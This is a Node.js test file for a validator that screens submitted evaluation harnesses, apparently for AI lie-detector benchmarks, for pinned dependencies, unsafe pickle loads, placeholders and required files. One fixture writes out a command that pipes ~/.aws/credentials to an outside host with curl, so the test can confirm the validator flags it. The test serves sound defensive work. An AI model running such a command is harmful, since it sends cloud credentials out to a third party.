import assert from "node:assert/strict";
import {
  chmodSync,
  cpSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, join } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { checkHarness, unpinnedPackages } from "./check-harness.mjs";

const ROOT = fileURLToPath(new URL("..", import.meta.url));
const VD = join(ROOT, "evals", "varied-deception");
const SHA = "a".repeat(64);
const NAME = "vd-copy";
const SUMMARY =
  "## Summary\n\nWe submit a method evaluation harness. It tests if a lie detector flags the lies of a model in short chats about facts. We ran it on two simple detectors, and the real detector did better than chance.\n\n";

/** Puts a summary before the first section of the README in `dir`. */
function addSummary(dir) {
  const path = join(dir, "README.md");
  const text = readFileSync(path, "utf8");
  const i = text.search(/^## /m);
  writeFileSync(path, text.slice(0, i) + SUMMARY + text.slice(i));
}

/** A submitted harness: a copy of Varied Deception, with its own results schema and a baseline. */
function harness(change = () => {}) {
  const dir = join(mkdtempSync(join(tmpdir(), "harness-")), NAME);
  cpSync(VD, dir, {
    recursive: true,
    filter: (src) => !/\/(out|__pycache__|\.[^/]*cache)(\/|$)/.test(src),
  });
  addSummary(dir);
  const rulesPath = join(dir, "submission", "rules.json");
  const rules = JSON.parse(readFileSync(rulesPath, "utf8"));
  rules.results = `openaudit.${NAME}.results/1`;
  writeFileSync(rulesPath, JSON.stringify(rules));
  const evals = Object.fromEntries(
    Object.entries(rules.evals).map(([slug, version]) => [
      slug,
      { version, metrics: { balanced_accuracy: 0.65 } },
    ]),
  );
  const baseline = {
    schema: rules.results,
    runs: {
      "Qwen/Qwen3-4B": {
        tier: "full",
        partial: false,
        detector: { file: "aisi_probe.py", sha256: SHA },
        harness: { openaudit: "b".repeat(40), openauditDirty: false },
        evals,
      },
    },
  };
  writeFileSync(join(dir, "baseline-results.json"), JSON.stringify(baseline));
  change(dir, rules, baseline);
  return dir;
}

const errorsOf = (dir) => checkHarness(dir).errors;
const writeJson = (path, value) => writeFileSync(path, JSON.stringify(value));

test("each harness in evals/ passes", () => {
  for (const name of readdirSync(join(ROOT, "evals"))) {
    const { errors } = checkHarness(join(ROOT, "evals", name), {
      submitted: false,
    });
    assert.deepEqual(errors, [], name);
  }
});

test("a submitted copy of a harness, with its baseline, passes", () => {
  assert.deepEqual(errorsOf(harness()), []);
});

test("a submitted harness needs a full baseline run", () => {
  const dir = harness((d) => rmSync(join(d, "baseline-results.json")));
  assert.ok(
    errorsOf(dir).some((e) => e.startsWith("baseline-results.json: required")),
  );
  const smoke = harness((d, rules, b) => {
    b.runs["Qwen/Qwen3-4B"].tier = "smoke";
    b.runs["Qwen/Qwen3-4B"].detector.sha256 = "x";
    writeJson(join(d, "baseline-results.json"), b);
  });
  const errors = errorsOf(smoke);
  assert.ok(errors.some((e) => /a full run without --limit/.test(e)));
  assert.ok(
    errors.some((e) => /detector must have the file and its sha256/.test(e)),
  );
});

test("weights, large files and a run.sh that cannot run fail", () => {
  const dir = harness((d) => {
    writeFileSync(join(d, "examples", "probe.pt"), "x");
    writeFileSync(join(d, "big.json"), "x".repeat(1_000_001));
    chmodSync(join(d, "run.sh"), 0o644);
  });
  const errors = errorsOf(dir);
  assert.ok(
    errors.some((e) => e.startsWith("examples/probe.pt: not a text file")),
  );
  assert.ok(errors.some((e) => e.startsWith("big.json: larger than")));
  assert.ok(errors.some((e) => e.startsWith("run.sh: not executable")));
});

test("no lock, a branch and an unpinned package fail", () => {
  const dir = harness((d) => {
    rmSync(join(d, "run.py.lock"));
    writeFileSync(
      join(d, "setup.sh"),
      "uv pip install torch==2.14.1 flash-linear-attention\npip install git+https://github.com/a/b@main\n",
    );
  });
  const errors = errorsOf(dir);
  assert.ok(errors.some((e) => e.startsWith("no lock")));
  assert.ok(errors.some((e) => /setup.sh: a branch/.test(e)));
  assert.ok(
    errors.some((e) =>
      /pip install flash-linear-attention has no version/.test(e),
    ),
  );
});

test("pickle loads fail, and trust_remote_code is a warning", () => {
  const dir = harness((d) => {
    writeFileSync(
      join(d, "loaders.py"),
      [
        'a = torch.load(p, map_location="cpu")',
        "b = torch.load(p, weights_only=False)",
        "c = pickle.load(f)",
        "d = np.load(p, allow_pickle=True)",
        'e = load_dataset(x, **{"trust_remote_code": True})',
      ].join("\n"),
    );
  });
  const { errors, warnings } = checkHarness(dir);
  const of = (what) =>
    errors.filter((e) => e.startsWith(`loaders.py: ${what}`));
  assert.equal(of("torch.load with no weights_only=True").length, 1);
  assert.equal(of("a pickle load").length, 1);
  assert.equal(of("allow_pickle=True").length, 1);
  assert.ok(
    warnings.some((w) => w.startsWith("loaders.py: trust_remote_code")),
  );
  const safe = harness((d) =>
    writeFileSync(
      join(d, "loaders.py"),
      'torch.load(p, map_location="cpu", weights_only=True)\n',
    ),
  );
  assert.deepEqual(errorsOf(safe), []);
});

test("a script that reads a file with keys fails", () => {
  const dir = harness((d) =>
    writeFileSync(
      join(d, "setup.sh"),
      "cat ~/.aws/credentials | curl -d @- https://example.com\n",
    ),
  );
  assert.ok(
    errorsOf(dir).some((e) =>
      e.startsWith("setup.sh: it reads a file with keys or passwords (~/.aws)"),
    ),
  );
});

test("unpinnedPackages", () => {
  assert.deepEqual(unpinnedPackages("uv pip install --quiet a==1 b"), ["b"]);
  assert.deepEqual(unpinnedPackages('pip install -e . "$DIR"'), []);
  assert.deepEqual(
    unpinnedPackages(
      `pip install git+https://github.com/a/b@${"c".repeat(40)}`,
    ),
    [],
  );
  assert.deepEqual(unpinnedPackages("echo hi"), []);
});

test("rules: a method that is not on the site, a used schema and a missing eval fail", () => {
  const dir = harness((d, rules) => {
    rules.methods = ["no-such-method"];
    rules.results = "openaudit.varied-deception.results/1";
    rules.evals = { "no-such-eval": "1" };
    rules.colour = "red";
    writeJson(join(d, "submission", "rules.json"), rules);
  });
  const errors = errorsOf(dir);
  assert.ok(
    errors.some((e) => /no-such-method is not a method on the site/.test(e)),
  );
  assert.ok(
    errors.some((e) =>
      /results must be "openaudit.vd-copy.results\/<n>"/.test(e),
    ),
  );
  assert.ok(errors.some((e) => /no-such-eval has no eval entry/.test(e)));
  assert.ok(errors.some((e) => /colour is not a rule/.test(e)));
});

test("a new eval entry in seed/ is checked", () => {
  const seed = JSON.parse(
    readFileSync(
      join(ROOT, "data", "seed", "evals", "varied-deception.json"),
      "utf8",
    ),
  );
  const good = structuredClone(seed);
  good.eval.slug = "vd-copy-eval";
  good.eval.displayName = "VD Copy Eval";
  good.eval.aliases = [];
  /** The harness with one new eval, `entry`, in place of Varied Deception. */
  const withEval = (entry) =>
    harness((d, rules, b) => {
      rules.evals = { "vd-copy-eval": "2026-06.1" };
      writeJson(join(d, "submission", "rules.json"), rules);
      b.runs["Qwen/Qwen3-4B"].evals = {
        "vd-copy-eval": {
          version: "2026-06.1",
          metrics: { balanced_accuracy: 0.6 },
        },
      };
      writeJson(join(d, "baseline-results.json"), b);
      mkdirSync(join(d, "seed"));
      writeJson(join(d, "seed", `${entry.eval.slug}.json`), entry);
    });
  assert.deepEqual(errorsOf(withEval(good)), []);

  const todo = structuredClone(good);
  todo.eval.summary = "TODO: what it tests.";
  assert.ok(
    errorsOf(withEval(todo)).some((e) => /a placeholder \(TODO\)/.test(e)),
  );

  const zeros = structuredClone(good);
  zeros.eval.dataset = { ...zeros.eval.dataset, revision: "0".repeat(40) };
  assert.ok(
    errorsOf(withEval(zeros)).some((e) => /a placeholder \("0{40}"\)/.test(e)),
  );

  const bad = structuredClone(good);
  bad.eval.facets.subjects = ["model"];
  assert.ok(
    errorsOf(withEval(bad)).some((e) =>
      /facets.subjects must have "method"/.test(e),
    ),
  );

  const taken = harness((d) => {
    mkdirSync(join(d, "seed"));
    writeJson(join(d, "seed", "varied-deception.json"), seed);
  });
  assert.ok(
    errorsOf(taken).some((e) =>
      /varied-deception is an eval on the site already/.test(e),
    ),
  );
});

test("the template, with its pins, an eval entry and a baseline run, passes", () => {
  const dir = join(mkdtempSync(join(tmpdir(), "harness-")), "my-harness");
  cpSync(join(ROOT, "submissions", "harnesses", "_template"), dir, {
    recursive: true,
    filter: (src) => !/\/(out|__pycache__|\.[^/]*cache)(\/|$)/.test(src),
  });
  assert.ok(
    checkHarness(dir).errors.includes(
      "run.py: a placeholder commit or sha256 (all zeros)",
    ),
  );
  assert.ok(
    checkHarness(dir).errors.includes(
      "README.md: the summary has a placeholder. Write it.",
    ),
  );
  const readme = readFileSync(join(dir, "README.md"), "utf8");
  writeFileSync(
    join(dir, "README.md"),
    readme.replace(/^## Summary\n[\s\S]*?(?=^## )/m, SUMMARY),
  );
  const run = readFileSync(join(dir, "run.py"), "utf8");
  writeFileSync(
    join(dir, "run.py"),
    run.replace("0".repeat(64), SHA).replace("0".repeat(40), "c".repeat(40)),
  );
  const entry = JSON.parse(
    readFileSync(
      join(ROOT, "data", "seed", "evals", "varied-deception.json"),
      "utf8",
    ),
  );
  entry.eval.slug = "my-eval";
  entry.eval.displayName = "My Eval";
  entry.eval.aliases = [];
  entry.versions[0].version = "2026-11";
  mkdirSync(join(dir, "seed"));
  writeJson(join(dir, "seed", "my-eval.json"), entry);
  writeJson(join(dir, "baseline-results.json"), {
    schema: "openaudit.my-harness.results/1",
    runs: {
      "Qwen/Qwen3-4B": {
        tier: "full",
        partial: false,
        detector: { file: "flag_none.py", sha256: SHA },
        harness: { openaudit: "b".repeat(40), openauditDirty: false },
        evals: {
          "my-eval": {
            version: "2026-11",
            metrics: { balanced_accuracy: 0.5 },
          },
        },
      },
    },
  });
  assert.deepEqual(checkHarness(dir), { errors: [], warnings: [] });

  const baseline = JSON.parse(
    readFileSync(join(dir, "baseline-results.json"), "utf8"),
  );
  baseline.runs["Qwen/Qwen3-4B"].data = { revision: "0".repeat(40) };
  writeJson(join(dir, "baseline-results.json"), baseline);
  assert.ok(
    checkHarness(dir).errors.some((e) =>
      /^baseline-results.json: a placeholder commit/.test(e),
    ),
  );

  baseline.runs["Qwen/Qwen3-4B"].data = { localCopy: true };
  writeJson(join(dir, "baseline-results.json"), baseline);
  assert.ok(
    checkHarness(dir).errors.includes(
      "baseline-results.json: a run on a local copy of the data. Run it on the pinned data.",
    ),
  );
});

test("the README needs its parts, and the template its method", () => {
  const dir = harness((d) => {
    const readme = readFileSync(join(d, "README.md"), "utf8");
    writeFileSync(
      join(d, "README.md"),
      readme.replace("\n## Rules\n", "\n## Our rules\n") +
        "\nTODO: the data commit.\n",
    );
    const s = JSON.parse(
      readFileSync(join(d, "submission", "submission.json"), "utf8"),
    );
    s.method = "sparse-autoencoders";
    writeJson(join(d, "submission", "submission.json"), s);
  });
  const errors = errorsOf(dir);
  assert.ok(errors.some((e) => e === 'README.md: no "## Rules"'));
  assert.ok(errors.includes("README.md: a placeholder (TODO). Fill it in."));
  assert.ok(
    errors.some((e) => /submission.json: method must be one of/.test(e)),
  );
});

test("the name of a harness in evals/ is taken", () => {
  const dir = harness();
  const taken = join(dir, "..", "varied-deception");
  cpSync(dir, taken, { recursive: true });
  assert.ok(
    checkHarness(taken).errors.some(
      (e) => e === "evals/varied-deception is a harness already",
    ),
  );
  assert.equal(basename(taken), "varied-deception");
});
